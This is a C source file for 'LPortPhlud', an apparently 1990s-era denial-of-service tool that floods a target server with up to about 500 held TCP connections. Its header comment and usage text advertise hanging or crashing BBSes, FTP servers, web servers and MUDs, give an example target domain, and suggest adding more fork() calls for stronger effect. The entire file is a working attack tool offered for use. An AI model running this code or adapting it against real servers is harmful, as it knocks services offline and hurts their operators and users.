/*
 *** LPortPhlud, by Sniper/ph|ud
 *** Linux server flooder
 *** 
 *** Usage: ./lportphlud <server> <port> <delay> 
 ***                                    
 ***    ex: ./lportphlud www.bluffsrun.com 80                                 
 ***        will hog up as many connects as it can
 ***    ex: ./lportphlud www.bluffsrun.com 80 1000
 ***        sets delay to 1000<ms> will disconnect on connect at 1000ms delay
 ***   if no delay is set it will just connect on as many sockets up to 500 
 ***
 *** Typical Uses: bbs'; can hang nodes if you use disconnect on connect mode
 ***               ftps; hog connects, somtimes crashes server
 ***               web servers; hog connects, crashes server
 ***               muds; hog connects, hang nodes
 ***
 *** For some interesting effects, throw some more fork()'s in there :)
 *** This is extremly fast too, with the use of more fork()'s you can have 
 *** more then 10-20 sockets connecting at a time. This version only does 2 
 *** sockets at a time. If you want to add more forks go for it. You'll have
 *** to edit a bit of the code, but it should be pretty strait forward.
 *** Since we only fork() once, this supports upto 500 max connects.
 *** Also this does not check to see whether or not the connection stays active
 *** basically when i tested it to check up on the connected sockets it took
 *** WAY too long. So basically if a socket gets dropped you wont know, but 
 *** if it does get dropped, another socket will take its place. So you NEVER
 *** loose any of your connections. But it may look like there is MORE sockets 
 *** connected then there really is.
 ***
 *** latez, Sniper.
 */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netdb.h>

#define MAX_FD 249

void	 PortPhlud(char *host, long port, long delay);

int main(int argc, char *argv[]) {

pid_t pid;

   if(argc < 3) {
      printf("Port Phlud Linux Style, by Sniper\n");
      printf("\tUsage: %s <target host> <port> <delay>\n", argv[0]);
      printf("\t   Ex: %s www.bluffsrun.com 80\n", argv[0]);
      printf("\t   Ex: %s www.bluffsrun.com 80 1000\n", argv[0]);
      exit(1);
   }
printf("Port Phlud Linux Style, by Sniper\n");

pid = fork();
if(pid != 0)
   PortPhlud(argv[1], atol(argv[2]), (argc > 3) ? atol(argv[3]): 0);
else
   PortPhlud(argv[1], atol(argv[2]), (argc > 3) ? atol(argv[3]): 0);
return(0);
}

void	PortPhlud(char *host, long port, long delay) {

   struct hostent *he;
   struct sockaddr_in addr[MAX_FD];
   int sockfd[MAX_FD], isock, itot;

   if((he=gethostbyname(host)) == NULL) {
      herror("gethostbyname");
      exit(1);
    }

for(isock = 0; isock < MAX_FD; isock++) {

    sockfd[isock] = socket(AF_INET, SOCK_STREAM, 0);
    
    addr[isock].sin_family = AF_INET;
    addr[isock].sin_port = htons(port);
    addr[isock].sin_addr = *((struct in_addr *)he->h_addr);
    bzero(&(addr[1].sin_zero), 8);
     
    if(connect(sockfd[isock], &addr[isock], sizeof(addr[0])) == -1) {
       fflush(stdout);
       usleep(9);
       printf("\r%i sockets connected to %s | connect %i failed <retrying>", itot * 2, host, (itot * 2) - 1);
       isock--; 
      }
    else {
       itot++;
       fflush(stdout);
       printf("\r%i sockets connected to %s", itot * 2, host);
         if(delay > 0) {
            usleep(delay);
            close(sockfd[isock]);
            isock--; itot--;
         }
    }
   if(isock == MAX_FD - 1) 
      isock = 0;
}

}

